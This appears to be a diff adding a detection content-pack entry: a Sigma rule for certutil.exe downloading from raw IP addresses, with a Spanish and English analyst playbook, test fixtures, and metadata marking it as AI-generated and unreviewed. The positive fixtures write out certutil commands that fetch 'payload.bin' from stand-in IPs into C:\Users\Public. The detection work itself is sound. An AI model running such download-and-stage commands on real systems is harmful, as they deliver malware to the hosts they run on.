@@ -1,0 +1,130 @@
+{
+  "rule": {
+    "id": "13e6fe51-d478-4c7e-b0f2-6da9b400a829",
+    "title": "Suspicious File Downloaded From Direct IP Via Certutil.EXE",
+    "level": "high",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_certutil_download_direct_ip.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_certutil_download_direct_ip.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1027",
+      "T1105"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó certutil.exe con una opción de descarga (urlcache, verifyctl o URL) apuntando a una URL con una dirección IP directa en lugar de un dominio. Es una técnica común para traer payloads saltándose controles basados en reputación de dominio.",
+      "what_it_detects": "Creación de procesos de certutil.exe (por Image o OriginalFileName, por lo que también detecta copias renombradas) cuyo CommandLine incluye 'urlcache ', 'verifyctl ' o 'URL ' junto con '://' seguido de un dígito (1-9). Se excluyen las URL que contienen '://7-' (7-zip.org). El filtro de IP privadas viene comentado, así que las IP internas también generan alertas.",
+      "why_it_matters": "Certutil es un binario firmado por Microsoft que se abusa como LOLBin para descargar herramientas (T1105, Ingress Tool Transfer) y para decodificar contenido ofuscado (T1027). Descargar desde una IP directa suele indicar infraestructura de atacante sin dominio y un posible paso inicial de malware o de movimiento lateral.",
+      "triage_steps": [
+        "Revise el CommandLine completo: extraiga la IP, el puerto, el nombre del archivo remoto y la ruta de destino local (p. ej. C:\\Users\\Public o %TEMP%).",
+        "Determine si la IP es interna (10., 172.16-31., 192.168., 127.) o pública, y consulte su reputación e historial en el proxy o firewall.",
+        "Compare Image con OriginalFileName: si certutil fue renombrado o se ejecuta fuera de System32, aumente la prioridad.",
+        "Analice ParentImage y la cadena de procesos: Office, wscript, mshta, powershell o cmd lanzado por un documento son señales fuertes de compromiso.",
+        "Busque en el mismo host, +/- 15 minutos, la creación del archivo descargado, su hash, ejecuciones posteriores y usos de certutil -decode.",
+        "Correlacione conexiones de red hacia la misma IP desde otros endpoints y revise alertas previas del mismo usuario y host."
+      ],
+      "false_positives": [
+        "Scripts administrativos o de despliegue que descargan archivos desde un servidor interno referenciado por IP.",
+        "Verificación de CRL/AIA con verifyctl o -URL contra servicios de PKI publicados por IP.",
+        "Ejercicios autorizados de red team o pruebas de detección (p. ej. Atomic Red Team)."
+      ],
+      "response_steps": [
+        "Confirme con el dueño del host o del script si la descarga es legítima antes de actuar.",
+        "Si es sospechosa, aísle el endpoint y bloquee la IP en el firewall y el proxy.",
+        "Recupere y analice el archivo descargado y su hash; elimínelo y limpie la caché de certutil solo tras preservar la evidencia.",
+        "Busque la misma IP o hash en toda la flota, restablezca credenciales del usuario afectado si hubo ejecución y documente las exclusiones legítimas."
+      ],
+      "severity_rationale": "El nivel high es adecuado porque certutil rara vez descarga desde IP directas en uso legítimo y este patrón está muy asociado a la entrega de malware."
+    },
+    "en": {
+      "summary": "certutil.exe ran with a download option (urlcache, verifyctl or URL) pointing to a URL that uses a raw IP address instead of a domain. This is a common way to pull payloads while bypassing domain reputation controls.",
+      "what_it_detects": "Process creation of certutil.exe (by Image or OriginalFileName, so renamed copies are caught) whose CommandLine contains 'urlcache ', 'verifyctl ' or 'URL ' plus '://' followed by a digit 1-9. URLs containing '://7-' (7-zip.org) are excluded. The private IP filter is commented out, so internal IPs also alert.",
+      "why_it_matters": "Certutil is a Microsoft-signed binary abused as a LOLBin to download tools (T1105, Ingress Tool Transfer) and decode obfuscated content (T1027). Downloads from a bare IP often point to attacker infrastructure and an early malware staging step.",
+      "triage_steps": [
+        "Read the full CommandLine: extract the IP, port, remote file name and local destination path (e.g. C:\\Users\\Public or %TEMP%).",
+        "Decide whether the IP is internal (10., 172.16-31., 192.168., 127.) or public, and check its reputation and history in proxy or firewall logs.",
+        "Compare Image with OriginalFileName: a renamed certutil or one running outside System32 raises priority.",
+        "Review ParentImage and the process tree: Office, wscript, mshta, powershell or a document-spawned cmd strongly suggest compromise.",
+        "On the same host within +/- 15 minutes, look for the downloaded file creation, its hash, later execution and certutil -decode usage.",
+        "Correlate network connections to the same IP from other endpoints and review earlier alerts for the same user and host."
+      ],
+      "false_positives": [
+        "Admin or deployment scripts that download files from an internal server referenced by IP.",
+        "CRL/AIA checks with verifyctl or -URL against PKI services published by IP.",
+        "Authorized red team exercises or detection testing (e.g. Atomic Red Team)."
+      ],
+      "response_steps": [
+        "Confirm with the host or script owner whether the download is legitimate before acting.",
+        "If suspicious, isolate the endpoint and block the IP at the firewall and proxy.",
+        "Collect and analyze the downloaded file and hash; delete it and clear the certutil cache only after preserving evidence.",
+        "Hunt for the same IP or hash fleet-wide, reset the user's credentials if the file executed, and document legitimate exclusions."
+      ],
+      "severity_rationale": "High fits because certutil rarely downloads from raw IPs in legitimate use and the pattern is strongly tied to malware delivery."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "certutil urlcache download from a public IP into C:\\Users\\Public, spawned by cmd from Word",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\certutil.exe",
+          "OriginalFileName": "CertUtil.exe",
+          "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.45/payload.bin C:\\Users\\Public\\update.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c certutil.exe -urlcache -split -f http://203.0.113.45/payload.bin C:\\Users\\Public\\update.exe"
+        }
+      },
+      {
+        "description": "Renamed certutil (matched by OriginalFileName) using verifyctl against an IP with a port",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Users\\Public\\cu.exe",
+          "OriginalFileName": "CertUtil.exe",
+          "CommandLine": "C:\\Users\\Public\\cu.exe -verifyctl -f -split http://198.51.100.23:8080/a.txt",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "certutil downloading the 7-Zip installer from https://7-zip.org, excluded by filter_main_seven_zip",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\certutil.exe",
+          "OriginalFileName": "CertUtil.exe",
+          "CommandLine": "certutil.exe -urlcache -split -f https://7-zip.org/a/7z2301-x64.exe C:\\Temp\\7z.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      {
+        "description": "certutil urlcache download from a hostname, not a direct IP",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0310.andes.example.com",
+          "User": "ANDES\\lgomez",
+          "Image": "C:\\Windows\\System32\\certutil.exe",
+          "OriginalFileName": "CertUtil.exe",
+          "CommandLine": "certutil.exe -urlcache -f http://pki.example.com/crl/root.crl C:\\Temp\\root.crl",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
